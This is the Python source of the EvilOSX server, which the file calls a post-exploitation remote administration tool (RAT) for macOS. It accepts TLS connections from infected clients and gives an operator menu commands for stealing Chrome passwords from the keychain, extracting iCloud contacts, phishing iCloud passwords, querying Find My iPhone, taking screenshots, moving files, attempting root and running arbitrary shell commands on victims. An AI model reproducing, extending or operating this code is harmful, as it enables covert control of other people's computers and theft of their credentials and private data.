#!/usr/bin/env python
# EvilOSX: A pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX.
import socket
from socket import SHUT_RDWR
import ssl
from threading import Thread
import os
import struct
import uuid
import base64

try:
    import gnureadline
except ImportError:
    import readline

BANNER = '''\
  ______       _  _   ____    _____ __   __
 |  ____|     (_)| | / __ \  / ____|\ \ / /
 | |__ __   __ _ | || |  | || (___   \ V / 
 |  __|\ \ / /| || || |  | | \___ \   > <  
 | |____\ V / | || || |__| | ____) | / . \ 
 |______|\_/  |_||_| \____/ |_____/ /_/ \_\\
 '''

MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"

status_messages = []


def print_status():
    for status in status_messages:
        print status


def print_clients(server):
    """Prints the connected clients."""
    if not server.clients:
        print MESSAGE_ATTENTION + "No available clients."
    else:
        computer_names = []

        for client in server.clients:
            try:
                computer_names.append(client.send_command("get_computer_name"))
            except socket.error:
                # Client is no longer connected.
                client.disconnect()

        if not server.clients:
            print MESSAGE_ATTENTION + "No available clients."
        else:
            print MESSAGE_INFO + str(len(server.clients)) + " client(s) available:"

            for client_id in range(len(computer_names)):
                print "    {0} = {1}".format(str(client_id), computer_names[client_id])


class Client:
    is_connected = False

    def __init__(self, connection):
        self.__connection = connection
        self.is_connected = True

    def __send_message(self, message):
        # Prefix each message with a 4-byte length (network byte order)
        prefixed_message = struct.pack('>I', len(message)) + message

        self.__connection.sendall(prefixed_message)

    def __receive_message(self):
        # Read message length and unpack it into an integer
        message_length = self.__receive_all(4)

        if not message_length:
            return None

        msglen = struct.unpack('>I', message_length)[0]

        # Read the message data
        return self.__receive_all(msglen)

    def __receive_all(self, message_length):
        """Helper function to receive x bytes or return None if EOF is hit."""
        data = ''
        while len(data) < message_length:
            packet = self.__connection.recv(message_length - len(data))

            if not packet:
                return None
            data += packet
        return data

    def send_command(self, command):
        """Sends a command to the client and returns the response.

           :raises socket.error if the client disconnected.
        """
        try:
            self.__connection.settimeout(5)
            self.__send_message(command)

            response = self.__receive_message()
            self.__connection.settimeout(None)

            while response == "ping":
                # Not the response we want, try again.
                response = self.__receive_message()

            if not response:
                # Empty response, assume the client disconnected.
                raise socket.error
            else:
                return response
        except socket.error as ex:
            self.is_connected = False
            raise ex

    def get_prompt(self):
        """Returns the fancy terminal prompt for the client, otherwise None."""
        try:
            shell_info = self.send_command("get_shell_info").split("\t")

            green = '\033[92m'
            blue = '\033[94m'
            endc = '\033[0m'

            username = shell_info[0]
            hostname = shell_info[1]
            path = shell_info[2]

            return (green + "{0}@{1}" + endc + ":" + blue + "{2}" + endc + "$ ").format(username, hostname, path)
        except socket.error:
            # Client disconnected.
            return None

    def disconnect(self):
        """Disconnects the client."""
        status_messages.append(MESSAGE_ATTENTION + "Client disconnected!")

        self.is_connected = False
        try:
            self.__connection.shutdown(SHUT_RDWR)
            self.__connection.close()
        except Exception:
            pass


class Server(Thread):
    __clients = []  # The ID of the client is it's place in the array
    current_client = None

    def __init__(self, port):
        """Constructor"""
        Thread.__init__(self)

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind(('', port))
        self.server_socket.listen(128)  # Maximum connections Mac OSX can handle.

        status_messages.append(MESSAGE_INFO + "Successfully started the server on port {0}.".format(str(port)))

    def run(self):
        """Accept connections."""
        status_messages.append(MESSAGE_INFO + "Waiting for clients...")

        while True:
            client_connection, client_address = ssl.wrap_socket(self.server_socket, cert_reqs=ssl.CERT_NONE,
                                                                server_side=True, ssl_version=ssl.PROTOCOL_TLSv1,
                                                                keyfile="server.key", certfile="server.crt").accept()
            client = Client(client_connection)

            status_messages.append(MESSAGE_INFO + "Client \"{0}\" connected!".format(client.send_command("get_computer_name")))
            self.__clients.append(client)

    @property
    def clients(self):
        """Returns a list of connected clients."""

        # Check to see if all clients are still connected
        for client in self.__clients:
            if not client.is_connected:
                self.__clients.remove(client)

        return self.__clients


def generate_csr():
    if not os.path.isfile("server.key"):
        print MESSAGE_INFO + "Generating keys to encrypt sockets..."

        information = "/C=US/ST=EvilOSX/L=EvilOSX/O=EvilOSX/CN=EvilOSX"
        os.popen("openssl req -newkey rsa:2048 -nodes -x509 -subj {0} -keyout server.key -out server.crt 2>&1"
                 .format(information))


if __name__ == '__main__':
    try:
        print BANNER

        server_port = raw_input(MESSAGE_INPUT + "Port to listen on: ")
        server = Server(int(server_port))

        generate_csr()
        server.setDaemon(True)
        server.start()

        print MESSAGE_INFO + "Type \"help\" to get a list of available commands."

        while True:
            if server.current_client and server.current_client.is_connected:
                # Client connected, show fancy prompt.
                fancy_prompt = server.current_client.get_prompt()

                if fancy_prompt:
                    command = raw_input(fancy_prompt)
                else:
                    # Client disconnected.
                    print MESSAGE_ATTENTION + "Connected client disconnected!"

                    server.current_client.disconnect()
                    server.current_client = None
                    command = raw_input("> ")
            else:
                command = raw_input("> ")

            if command.strip() == "":
                continue

            if command == "help":
                if server.current_client:
                    print server.current_client.send_command("help")
                else:
                    print "help              -  Show this help menu."
                    print "status            -  Show debug information."
                    print "clients           -  Show a list of clients."
                    print "connect <ID>      -  Connect to the client."
                    print "exit              -  Close the server and exit."
            elif command == "status":
                print_status()
            elif command == "clients":
                print_clients(server)
            elif command.startswith("connect"):
                try:
                    specified_id = int(command.split(" ")[1])
                    server.current_client = server.clients[specified_id]

                    computer_name = server.current_client.send_command("get_computer_name")

                    print MESSAGE_INFO + "Connected to \"{0}\", ready to send commands.".format(computer_name)
                except (IndexError, ValueError) as ex:
                    print MESSAGE_ATTENTION + "Invalid client ID (see \"clients\")."
            elif command == "clear":
                os.system("clear")
            elif command == "exit" and not server.current_client:
                exit()
            else:
                # Commands that require an active connection.
                if not server.current_client:
                    print MESSAGE_ATTENTION + "Not connected to a client (see \"connect\")."
                else:
                    try:
                        if command == "exit":
                            server.current_client = None
                        elif command == "get_info":
                            print MESSAGE_INFO + "Getting system information..."
                            print server.current_client.send_command("get_info")
                        elif command == "get_root":
                            print MESSAGE_INFO + "Attempting to get root, this may take a while..."
                            print server.current_client.send_command("get_root")
                        elif command.startswith("download"):
                            try:
                                file_path = command.split(" ")[1]
                                response = server.current_client.send_command("download {0}".format(file_path))

                                if "Failed" in response:
                                    print response
                                else:
                                    current_directory = os.path.dirname(os.path.realpath(__file__))
                                    output_directory = current_directory + "/Downloads/"
                                    output_file = output_directory + os.path.basename(file_path)

                                    if not os.path.isdir(output_directory):
                                        os.mkdir(output_directory)

                                    with open(output_file, "wb") as open_file:
                                        open_file.write(base64.b64decode(response))

                                    print MESSAGE_INFO + "File written to {0}.".format(output_file)
                            except IndexError:
                                print MESSAGE_ATTENTION + "Please specify the remote file."
                        elif command.startswith("upload"):
                            print MESSAGE_INFO + "The file will be uploaded to the current remote folder."

                            if command == "upload":
                                upload_file = os.path.expanduser(raw_input(MESSAGE_INPUT + "Enter the local file's path: "))
                            else:
                                upload_file = os.path.expanduser(command.replace("upload ", ""))

                            if not os.path.isfile(upload_file):
                                print MESSAGE_ATTENTION + "File doesn't exist!"
                                continue

                            file_name = raw_input(MESSAGE_INPUT + "New filename (or empty for \"{0}\"): "
                                                  .format(os.path.basename(upload_file))) \
                                        or os.path.basename(upload_file)

                            with open(os.path.realpath(upload_file), "r") as open_file:
                                encoded_file = base64.b64encode(open_file.read())

                                if not encoded_file:
                                    print MESSAGE_ATTENTION + "Failed to upload: Empty file."
                                else:
                                    print server.current_client.send_command("upload {0} {1}"
                                                                             .format(file_name, encoded_file))
                        elif command == "chrome_passwords":
                            print MESSAGE_ATTENTION + "This will prompt the user to allow keychain access."
                            confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to continue? [Y/n] ")

                            if not confirm or confirm.lower() == "y":
                                print server.current_client.send_command("chrome_passwords")
                        elif command == "icloud_contacts":
                            response = server.current_client.send_command("icloud_contacts")

                            if "Failed to find" in response:  # Failed to find tokens.json
                                # Create tokens.json, warn that it may prompt the user.
                                print MESSAGE_ATTENTION + "This will prompt the user to allow keychain access."
                                confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to continue? [Y/n] ")

                                if not confirm or confirm.lower() == "y":
                                    decrypt_response = server.current_client.send_command("decrypt_mme")

                                    if "Failed" in decrypt_response:
                                        print decrypt_response
                                    else:
                                        # Send icloud_contacts again, should be successful this time.
                                        print server.current_client.send_command("icloud_contacts")
                            else:
                                print response
                        elif command.startswith("icloud_phish"):
                            email = raw_input(MESSAGE_INPUT + "iCloud email to phish: ")

                            if "@" not in email:
                                print MESSAGE_ATTENTION + "Please specify an email address."
                            else:
                                print MESSAGE_INFO + "Attempting to phish iCloud password, press Ctrl-C to stop..."

                                while True:
                                    try:
                                        response = server.current_client.send_command("icloud_phish {0}".format(email))

                                        print response
                                        break
                                    except KeyboardInterrupt:
                                        print MESSAGE_INFO + "Stopping phishing attempt, waiting for phishing output..."
                                        print server.current_client.send_command("icloud_phish_stop")
                                        break
                        elif command == "itunes_backups":
                            print server.current_client.send_command("itunes_backups")
                        elif command == "find_my_iphone":
                            print MESSAGE_INFO + "The target's email and password is required to get devices."
                            email = raw_input(MESSAGE_INPUT + "Email: ")
                            password = raw_input(MESSAGE_INPUT + "Password: ")

                            if "@" not in email or password.strip() == "":
                                print MESSAGE_ATTENTION + "Invalid email or password."
                            else:
                                print MESSAGE_INFO + "Getting find my iphone devices..."
                                response = server.current_client.send_command("find_my_iphone {0} {1}".format(email, password))

                                print response
                        elif command == "screenshot":
                            response = server.current_client.send_command("screenshot")

                            output_name = str(uuid.uuid4()).replace("-", "")[:12] + ".jpg"
                            output_folder = os.path.join(os.path.dirname(__file__), "Screenshots")
                            output_file = os.path.join(output_folder, output_name)

                            if not os.path.isdir(output_folder):
                                os.mkdir(output_folder)

                            try:
                                with open(output_file, "w") as open_file:
                                    open_file.write(base64.b64decode(response))

                                print MESSAGE_INFO + "Screenshot saved to: {0}".format(output_file)
                            except TypeError:
                                print MESSAGE_ATTENTION + "Failed to get screenshot (client in sleep mode?)."
                        elif command == "kill_client":
                            print MESSAGE_INFO + "Removing client..."
                            response = server.current_client.send_command("kill_client")

                            print MESSAGE_INFO + "Client response: {0}".format(response)
                            print MESSAGE_INFO + "Done."

                            server.current_client.disconnect()
                            server.current_client = None
                        else:
                            # Regular shell command.
                            response = server.current_client.send_command(command)

                            if command.startswith("cd") or command.startswith("rm"):  # Commands that have no output.
                                pass
                            elif response == "EMPTY":
                                print MESSAGE_ATTENTION + "No command output."
                            else:
                                print response
                    except socket.error:
                        # Client disconnected
                        print MESSAGE_ATTENTION + "Connected client disconnected!"

                        server.current_client.disconnect()
                        server.current_client = None
    except ValueError:
        print "[I] Invalid port."
    except KeyboardInterrupt:
        print ""
